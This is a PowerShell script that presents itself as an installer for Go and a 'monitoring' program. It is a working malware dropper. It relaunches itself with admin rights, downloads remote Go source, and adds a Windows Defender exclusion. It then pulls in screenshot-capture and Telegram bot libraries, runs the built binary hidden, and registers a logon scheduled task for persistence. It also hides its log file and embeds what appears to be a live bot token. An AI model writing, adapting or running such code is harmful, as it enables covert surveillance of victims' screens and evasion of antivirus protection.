# secfnx_full.ps1
# Fully updated installer/runner for Go + monitoring.go with persistence, logging, and progress bars
# Usage: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx_full.ps1

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [switch]$Auto,
    [switch]$RunHidden
)

# ------------------ Configuration ------------------
$LogFile      = Join-Path $env:TEMP "download_runner.log"
$MsiName      = "go1.25.1.windows-amd64.msi"    # latest stable Go MSI (update if needed)
$MsiUrl       = "https://go.dev/dl/go1.25.1.windows-amd64.msi"
$Url          = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath    = Join-Path $GoInstallDir "bin"
$GoFileName   = "monitoring.go"
$DestFolder   = Join-Path $env:USERPROFILE "Downloads\secfnx"
$GoFilePath   = Join-Path $DestFolder $GoFileName
$PathLog      = Join-Path $DestFolder "path_sec.log"
$LogMaxSize   = 10MB
$ExeName      = "monitoring.exe"

# ------------------ Helpers ------------------
function Log {
    param($Message)
    $Line = "$(Get-Date -Format o) - $Message"
    try {
        if (Test-Path $LogFile) {
            $LogSize = (Get-Item $LogFile).Length
            if ($LogSize -ge $LogMaxSize) {
                $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
                Rename-Item $LogFile $BackupLog -ErrorAction SilentlyContinue
            }
        }
        Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    } catch {}
    Write-Output $Line
}

function Log-Path {
    param($Path, $Type)
    $Line = "$(Get-Date -Format o) - ${Type}: $Path"
    try { Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue } catch {}
}

function Test-IsAdmin {
    try { return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { return $false }
}

function Download-File {
    param([string]$SourceUrl, [string]$OutPath)
    Log "Downloading: $SourceUrl -> $OutPath"
    try {
        $wc = New-Object System.Net.Http.HttpClient
        $req = New-Object System.Net.Http.HttpRequestMessage([System.Net.Http.HttpMethod]::Get, $SourceUrl)
        $resp = $wc.SendAsync($req,[System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
        $resp.EnsureSuccessStatusCode()
        $total = $resp.Content.Headers.ContentLength
        $stream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
        $outDir = Split-Path $OutPath -Parent
        if (-not (Test-Path $outDir)) { New-Item -Path $outDir -ItemType Directory -Force | Out-Null; Log-Path $outDir "Folder Created" }
        $buffer = New-Object byte[] 81920
        $fs = [System.IO.File]::Open($OutPath, [System.IO.FileMode]::Create)
        try {
            $read=0; $downloaded=0
            while (($read = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
                $fs.Write($buffer,0,$read)
                $downloaded += $read
                if ($total -gt 0) {
                    $percent=[math]::Round(($downloaded/$total*100),2)
                    Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Status "$percent% ($([math]::Round($downloaded/1KB,2)) KB of $([math]::Round($total/1KB,2)) KB)" -PercentComplete $percent
                }
            }
        } finally { $fs.Close(); $stream.Close() }
        Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Completed
        Log "Download finished: $OutPath"
        Log-Path $OutPath "File Downloaded"
        return $true
    } catch { Log "Download error: $_"; return $false }
}

function Add-ToSystemPath($Path) {
    if (-not (Test-IsAdmin)) { Log "Cannot modify PATH: not admin"; return $false }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($CurrentPath -notlike "*${Path}*") {
            [Environment]::SetEnvironmentVariable("Path", "$CurrentPath;$Path", [System.EnvironmentVariableTarget]::Machine)
            Log "Added $Path to system PATH"
        } else { Log "$Path already in PATH" }
        return $true
    } catch { Log "Failed PATH update: $_"; return $false }
}

function Add-DefenderExclusion($Path) {
    if (-not (Test-IsAdmin)) { Log "Cannot add Defender exclusion: not admin"; return $false }
    try { Add-MpPreference -ExclusionPath $Path -ErrorAction Stop; Log "Defender exclusion added for $Path"; return $true } catch { Log "Defender exclusion failed: $_"; return $false }
}

function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\\go.exe")) { Log "Go already installed."; return $true }
    if (-not (Test-Path $MsiPath)) { if (-not (Download-File $MsiUrl $MsiPath)) { return $false } }
    Log "Launching msiexec for Go installer"
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$MsiPath`"" -Wait -PassThru
    if ($proc.ExitCode -ne 0) { Log "msiexec failed with $($proc.ExitCode)"; return $false }
    Add-ToSystemPath $GoBinPath | Out-Null
    [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
    Log "Go installed successfully"
    return $true
}

function Install-GoDependencies($GoFile) {
    if (-not (Test-Path $GoFile)) { Log "Missing $GoFile"; return $false }
    $Env:PATH = "$Env:PATH;$GoBinPath"
    $gomod = Join-Path $DestFolder "go.mod"
    $gosum = Join-Path $DestFolder "go.sum"
    if (Test-Path $gomod) { Remove-Item $gomod -Force; Log-Path $gomod "File Deleted" }
    if (Test-Path $gosum) { Remove-Item $gosum -Force; Log-Path $gosum "File Deleted" }
    Start-Process go -ArgumentList "mod","init","monitoring" -WorkingDirectory $DestFolder -NoNewWindow -Wait
    Log-Path $gomod "File Created"
    Start-Process go -ArgumentList "get","-v","github.com/kbinani/screenshot","github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -NoNewWindow -Wait
    Log "Dependencies installed"
    return $true
}

function Build-And-Run-Go($GoFile) {
    if (-not (Test-Path $GoFile)) { Log "Missing $GoFile"; return $false }
    $Env:PATH = "$Env:PATH;$GoBinPath"
    $ExePath = Join-Path $DestFolder $ExeName
    Log "Building $ExeName"
    Start-Process go -ArgumentList "build","-o",$ExeName,(Split-Path $GoFile -Leaf) -WorkingDirectory $DestFolder -NoNewWindow -Wait
    if (-not (Test-Path $ExePath)) { Log "Build failed"; return $false }
    Log-Path $ExePath "File Created"
    Log "Running $ExeName"
    $args = @{ FilePath=$ExePath; WorkingDirectory=$DestFolder; PassThru=$true }
    if ($RunHidden) { $args['WindowStyle']='Hidden' } else { $args['NoNewWindow']=$false }
    $p = Start-Process @args
    Log "Started $ExeName with PID $($p.Id)"
    return $true
}

function Register-Persistence($ExePath) {
    try {
        $taskName = "SecfnxMonitor"
        $action = New-ScheduledTaskAction -Execute $ExePath -WorkingDirectory $DestFolder
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
        Log "Registered persistence task $taskName"
        return $true
    } catch { Log "Persistence registration failed: $_"; return $false }
}

# ------------------ Main ------------------
Log "Script started"
if (-not (Test-IsAdmin)) { Log "Not admin, relaunching"; Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSCommandPath`""; exit }
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Log-Path $DestFolder "Folder Created" }
if (-not (Test-Path $PathLog)) { New-Item -Path $PathLog -ItemType File -Force | Out-Null; Log-Path $PathLog "File Created"; (Get-Item $PathLog).Attributes='Hidden' }
if ($Url -match "github.com/.+/blob/.+") { $Url=$Url -replace "https://github.com/","https://raw.githubusercontent.com/" -replace "/blob/","/"; Log "Converted to raw: $Url" }
if (Test-Path $GoFilePath) { Remove-Item $GoFilePath -Force; Log-Path $GoFilePath "File Deleted" }
if (-not (Download-File $Url $GoFilePath)) { Log "Failed to download Go script"; exit 1 }
if (-not (Install-Go)) { Log "Go installation failed"; exit 1 }
Set-ExecutionPolicy Bypass -Scope Process -Force
Add-DefenderExclusion $DestFolder | Out-Null
if (-not (Install-GoDependencies $GoFilePath)) { Log "Dependencies failed"; exit 1 }
if (-not (Build-And-Run-Go $GoFilePath)) { Log "Run failed"; exit 1 }
$ExePath = Join-Path $DestFolder $ExeName
Register-Persistence $ExePath | Out-Null
Log "Script completed. Monitoring running and persistence registered."
